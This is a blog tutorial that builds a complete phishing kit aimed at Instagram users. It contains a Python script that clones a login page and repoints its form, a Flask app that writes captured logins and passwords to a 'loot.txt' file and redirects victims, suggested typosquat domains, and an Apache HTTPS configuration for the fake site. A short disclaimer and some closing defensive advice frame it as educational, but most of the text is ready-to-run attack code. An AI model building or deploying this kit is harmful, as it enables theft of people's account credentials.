---
title: A simple phishing exercise
author: hugo
date: 2023-03-27 00:10:00 +0800
categories: [Tutorial, programming]
tags: [keylogger, hacking, flask, python, phishing]
render_with_liquid: false
---


> This tutorial will guide you through the process of writing a phishing website. The author gives this example for educational purposes and does not incentivise you to apply these techniques without prior consent
{: .prompt-info }


## The art of deception

_The best defense is a good offense_. Once you're able to write this up and host it yourself you'll get a good grasp of how this attack works and what to look out for to stay protected on the internet. Let's define phishing and what we intend to do today.

`Phishing is a form of social engineering where attackers deceive people into revealing sensitive information or installing malware such as ransomware.` [`Wikipedia`](https://en.wikipedia.org/wiki/Phishing)

## Requirements

The only thing you'll need in this tutorial are three things: a server, python and a domain name server. You could perform this on a serverless system like AWS lambda but that is out of scope. Going serverless gives you the advantage of paying only for the actual amount of compute time used which is a lot cheaper than renting an EC2 instance by the hour.

Your domain name server will be hosted at a registrar who will sell you a _www._ domain for a fee and redirect that traffic onto an IP address of your choosing. Let's imagine we want to route _www.instagram.com_ traffic towards our trap. The way you would do it is to search for a domain name that looks similar as for example _www.instagran.com_ or _www.imstagram.com_. You could try and host the domain name server on your own infrastructure but that is a whole different bal game as you would need to register an actual business and provide guarantees and infrastructure. I know that hosting your own registrar sounds like a fun idea but unless you have deep pockets it's not going to happen.

## Setting up the local environment

Let's get our local server setup to make sure everything works before hosting this on the internet.

The first step in this setup is to download python 2.7 by running `sudo apt install python2` on debian based linux distributions.

As always i recommend to start off by creating a virtual environement for your python project. Doing so allows you to make your builds more reproducible and prevent accidentaly removing or updating a dependency that might break another project that relies on that same dependency.

```console
    [waz@localhost]# virtualenv -p python2 env/
    [waz@localhost]# python
    Python 2.7.18 (default, Jul  1 2022, 10:30:50) 
    [GCC 11.2.0] on linux2
    Type "help", "copyright", "credits" or "license" for more information.
    
```
Do not run these two linux commands as sudo or as root because that will mean that everytime you will want to run it you'll have to escalate your privileges and that also brings up a whole set of new problems to deal with once you'll want the webserver or the proxy to read or execute certain files. The deploy user does not have sudo privileges if you've configured things properly so you'll run into a roadblock by creating a virtual environment as root.

You should now have an env folder with your newly created environment. In order to use it run the following command

```console
    [waz@localhost]# source env/bin/activate
```

You are now in a "containerized" version of python that is totally independent of the rest of your system which means it can have its own lifecycle, upgrades, downgrades without having any spillover effects on other projects.

```console
    [waz@localhost]# nano build.py
```

This next couple of lines will create a command line script that downloads the html page that you specify as command line arguments and parses through the page to identify the form field names you'll want to capture. Once the build process is done all that is left to do is to serve this malicious page to your webserver

```python
import sys
import os
import shutil
import urllib2

from bs4 import BeautifulSoup


def relative_root(url):
    if '?' in url:
        url = url[:url.find('?')]
    if url.count('/') == 2:
        return url + '/'
    else:
        return url[:url.rfind('/')] + '/'


def absolute_root(url):
    if '?' in url:
        url = url[:url.find('?')]
    if url.count('/') == 2:
        return url
    else:
        return url[:url.find('/',8)]


def relative_to_absolute(url, link):
    if link.startswith('http://') or link.startswith('https://') or link.startswith('data:'):
        # already absolute, skipping
        return link
    if link.startswith('//'):
        # just add protocol
        link = 'http:' + link
        return link
    if link[0] == '/':
        # Absolute URL
        link = absolute_root(url) + link
        return link
    else:
        # Relative URL
        link = relative_root(url) + link
        return link


def download_page(url, target):
    html = urllib2.urlopen(url).read()
    soup = BeautifulSoup(html, 'lxml')
    for elem in soup.find_all():
        if elem.get('src', None):
            elem['src'] = relative_to_absolute(url, elem['src'])
        if elem.get('href', None):
            elem['href'] = relative_to_absolute(url, elem['href'])
    with open(target, "w") as f:
        f.write(soup.encode_contents())


def edit_page(filename):
    original_page = open(filename, 'r').read()
    soup = BeautifulSoup(original_page, 'lxml')
    forms = soup.find_all('form')
    print "[*] Found forms:"
    i = 0
    for f in forms:
        print "FORM " + str(i) + " --> " +  f.get('action', 'None')
        i += 1
    while True:
        try:
            i = int(raw_input('Form to log: '))
        except ValueError:
            print "Enter the form number"
        try:
            f = forms[i]
            break
        except IndexError:
            print "Invalid form number"
    print "Selected form " + str(i) + '\n'
    f['action'] = "/form"
    loggable = []
    for i in  f.find_all('input'):
        if i.get('name'):
            loggable.append(i['name'])
    while True:
        print "[*] Form fields:"
        for i in range(len(loggable)):
            print str(i) + " - " + loggable[i]
        input_params = raw_input('Fields to log (comma separated, e.g 1,4,5): ').split(',')
        to_log = []
        try:
            for i in input_params:
                to_log.append(loggable[int(i)])
            break
        except:
            print "Invalid format: use form field identifiers (e.g 1,4,5)"
    print 'Logging: ' + str(to_log) + '\n'
    with open('index.html', "w") as f:
        f.write(soup.encode_contents())
    return to_log


def generate_phisher(to_log, url):
    payload = open('template_app/app.py', 'r').read()
    payload = payload.replace('__TO_LOG__', str(to_log))
    payload = payload.replace('__REDIRECT_URL__', url)
    with open('app.py', 'w') as f:
        f.write(payload)


def main(args):
    url = args.url
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url
    download_page(url, 'page.html')
    to_log = edit_page('page.html')
    os.remove('page.html')
    generate_phisher(to_log, url)
    output_dir = 'app'
    if os.path.exists(output_dir):
        shutil.rmtree(output_dir)
    os.makedirs(output_dir + '/templates')
    shutil.move('app.py', output_dir)
    shutil.move('index.html', output_dir + '/templates')
    shutil.copy('template_app/run.sh', output_dir)
    print "[*] Phishing page ready !"
    runnow = raw_input("Run now ? (y/n)")
    if runnow == 'y':
        os.system("app/run.sh")

if __name__ == '__main__':
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Builds a phishing Flask application.")
    parser.add_argument('url', help="The URL of the page to copy")
    args = parser.parse_args()
    main(args)

```

Python conveniently offers a micro web framework whose main strengths are its lightness and the unlimited use cases that a couple of lines of codes can provide. If you compare this approach to a classic approach like using Java or C# you'll find that the memory usage is in the megabytes range as opposed to the gigabytes range of Java and C# which is a huge advantage if you're not planning on investing thousands of euros into entreprise hardware. 

try running it yourself: `python ./build.py`


```python
import time

from flask import Flask
from flask import abort
from flask import request
from flask import redirect
from flask import render_template
from flask.ext.script import Manager


app = Flask(__name__)
manager = Manager(app)


LOG_FILE = 'loot.txt'
TO_LOG = ['login', 'password']
REDIRECT_URL = '__REDIRECT_URL__'


@app.route('/form', methods=['POST'])
def form():
    with open(LOG_FILE, 'a') as f:
        f.write(time.ctime() + '\n')
        # import pdb; pdb.set_trace()
        for i in TO_LOG:
            if i in request.form:
                log = i + ' = ' + request.form[i]
                f.write(log + '\n')
                print log
        f.write('\n')
    return "<script>window.location='" + REDIRECT_URL + "'</script>"


@app.route('/')
def index():
    return render_template('index.html')


if __name__ == '__main__':
    manager.run()
```

These lines of code spin up a web server that binds to whichever unix port you want it to bind to and serves up our malicious page. 
try running it yourself if you haven't already: `python app.py runserver -h 0.0.0.0 -p 8090`


<div style="padding-top: 5px; padding-bottom: 5px; position:relative; display:block; width: 100%; min-height:400px">

<iframe width="100%" height="400px" src="https://youtube.craftstudios.shop/uploads/netgear/Videos/chirpy/chirpy-a-simple-phishing-page-2023-03-27%2022-59-36.mp4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

</div>

Don't mind the keyring prompt that I ignored in the video above, the captured email + password can be found in the console logs as well as in the text log on the server as displayed on the video below:

<div style="padding-top: 5px; padding-bottom: 5px; position:relative; display:block; width: 100%; min-height:400px">

<iframe width="100%" height="400px" src="https://youtube.craftstudios.shop/uploads/netgear/Videos/chirpy/chirpy-a-simple-phishing-page-2023-03-27%2023-07-54.mp4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

</div>

## Hosting
The next step in our journey is to host this either on your infrastructure or the someone else's computer (commonly referred to as the cloud). I primarily use apache for everything so here is the vhost script that you will need to enable in apache. We can use certbot to self sign our own TLS certificates that will grant us with the iconic "green lock" to encrypt our communication. 

There are two types of configurations you could do. The easy route is to simply proxy everything through the http protocol or use a WSGI module to handle the integration with apache. We don't plan on tweaking the efficiency of the threading of our web page so for simplicity sakes here is the proxy settings

```apache

<VirtualHost *:80>

    ServerName www.imstagram.com
    RewriteEngine On
    RewriteCond %{HTTPS} !=on
    RewriteRule ^/?(._) https://%{SERVER_NAME}/$1 [R,L]

</VirtualHost>

<VirtualHost *:443>
    
    ServerName www.imstagram.com
    DocumentRoot "/path/to/your/project/"
    ServerAdmin your@email.com
    ProxyPass / http://localhost:8090/

    LogLevel warn
    ErrorLog ${APACHE_LOG_DIR}/error.log
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/www.imstagram.com/cert.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/www.imstagram.com/privkey.pem

</VirtualHost>

```

## Conclusion
As we saw in this example, hosting a phishing page is a lot easier than you would initially think. We were able to act as a middleman between instagram and the user with less than 200 lines of code. We also learned not to trust the website just because it has a green lock next to the URL bar and that the only cue taht could have tipped us off was on the URL itself. I wouldn't trust myself to read through each and every letter of every website I go to so here is what I recommend: 

1. Use bookmarks and never click on links outside of those bookmarks
2. I realize that the above is quite unpractical especially when we consider our children might not have the same dedication to security as we do. A much simpler approach would be to set up a local reverse DNS server that blocks out IPs related to advertisement and phishing. `Pihole` is one implementation of that service which I highly recommend. The learning curve is also extremely low so I encourage you to give it a try if you're a tinkerer like me

Thanks for reading this far

See you on the next one
